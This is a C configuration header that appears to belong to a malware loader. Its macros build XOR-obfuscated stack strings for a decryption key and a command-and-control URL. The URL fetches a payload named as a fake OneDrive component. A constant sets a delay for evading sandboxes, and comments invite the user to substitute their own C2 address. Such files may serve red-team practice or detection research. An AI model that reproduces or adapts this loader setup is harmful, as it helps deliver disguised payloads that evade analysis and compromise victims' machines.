#ifndef CONFIG_H
#define CONFIG_H

// macro generated for default key: '_sup3s3cr3tk3y_'
// MODIFY: put your key macro here - use tools/stack_string.py to generate
#define LOAD_GLOBAL_KEY(key_var, len_var) \
    char key_var[16]; \
    key_var[0] = 0xBA ^ 0xE5; \
    key_var[1] = 0xCB ^ 0xB8; \
    key_var[2] = 0x60 ^ 0x15; \
    key_var[3] = 0xC2 ^ 0xB2; \
    key_var[4] = 0x70 ^ 0x43; \
    key_var[5] = 0x5F ^ 0x2C; \
    key_var[6] = 0x9A ^ 0xA9; \
    key_var[7] = 0x57 ^ 0x34; \
    key_var[8] = 0x61 ^ 0x13; \
    key_var[9] = 0xB4 ^ 0x87; \
    key_var[10] = 0x91 ^ 0xE5; \
    key_var[11] = 0xBE ^ 0xD5; \
    key_var[12] = 0xC2 ^ 0xF1; \
    key_var[13] = 0x6F ^ 0x16; \
    key_var[14] = 0xBF ^ 0xE0; \
    key_var[15] = 0x00; \
    size_t len_var = 15;

// used string: "http://192.168.122.235:8080/OneDrive_Component.bin"
// MODIFY: put your IP address here - - use tools/stack_string.py to generate
#define C2_URL(url_var, url_len_var) \
char url_var[51]; \
    url_var[0] = 0xFD ^ 0x95; \
    url_var[1] = 0x93 ^ 0xE7; \
    url_var[2] = 0x07 ^ 0x73; \
    url_var[3] = 0xD9 ^ 0xA9; \
    url_var[4] = 0xC0 ^ 0xFA; \
    url_var[5] = 0x61 ^ 0x4E; \
    url_var[6] = 0x90 ^ 0xBF; \
    url_var[7] = 0x02 ^ 0x33; \
    url_var[8] = 0x33 ^ 0x0A; \
    url_var[9] = 0x79 ^ 0x4B; \
    url_var[10] = 0x85 ^ 0xAB; \
    url_var[11] = 0x73 ^ 0x42; \
    url_var[12] = 0x6F ^ 0x59; \
    url_var[13] = 0x13 ^ 0x2B; \
    url_var[14] = 0xD2 ^ 0xFC; \
    url_var[15] = 0xDF ^ 0xEE; \
    url_var[16] = 0xC1 ^ 0xF3; \
    url_var[17] = 0x16 ^ 0x24; \
    url_var[18] = 0x98 ^ 0xB6; \
    url_var[19] = 0x65 ^ 0x57; \
    url_var[20] = 0x2A ^ 0x19; \
    url_var[21] = 0x57 ^ 0x62; \
    url_var[22] = 0x42 ^ 0x78; \
    url_var[23] = 0x83 ^ 0xBB; \
    url_var[24] = 0x14 ^ 0x24; \
    url_var[25] = 0xF9 ^ 0xC1; \
    url_var[26] = 0x15 ^ 0x25; \
    url_var[27] = 0xD9 ^ 0xF6; \
    url_var[28] = 0x82 ^ 0xCD; \
    url_var[29] = 0x7B ^ 0x15; \
    url_var[30] = 0xF3 ^ 0x96; \
    url_var[31] = 0x8A ^ 0xCE; \
    url_var[32] = 0x45 ^ 0x37; \
    url_var[33] = 0xF3 ^ 0x9A; \
    url_var[34] = 0x85 ^ 0xF3; \
    url_var[35] = 0x60 ^ 0x05; \
    url_var[36] = 0xC5 ^ 0x9A; \
    url_var[37] = 0xA7 ^ 0xE4; \
    url_var[38] = 0x8C ^ 0xE3; \
    url_var[39] = 0x21 ^ 0x4C; \
    url_var[40] = 0x76 ^ 0x06; \
    url_var[41] = 0x05 ^ 0x6A; \
    url_var[42] = 0xF0 ^ 0x9E; \
    url_var[43] = 0x95 ^ 0xF0; \
    url_var[44] = 0xE6 ^ 0x88; \
    url_var[45] = 0x21 ^ 0x55; \
    url_var[46] = 0x15 ^ 0x3B; \
    url_var[47] = 0xAD ^ 0xCF; \
    url_var[48] = 0x35 ^ 0x5C; \
    url_var[49] = 0x28 ^ 0x46; \
    url_var[50] = 0x00; \
    size_t url_len_var = 50;

#define SANDBOX_DELAY_CYCLES 500000000

#endif
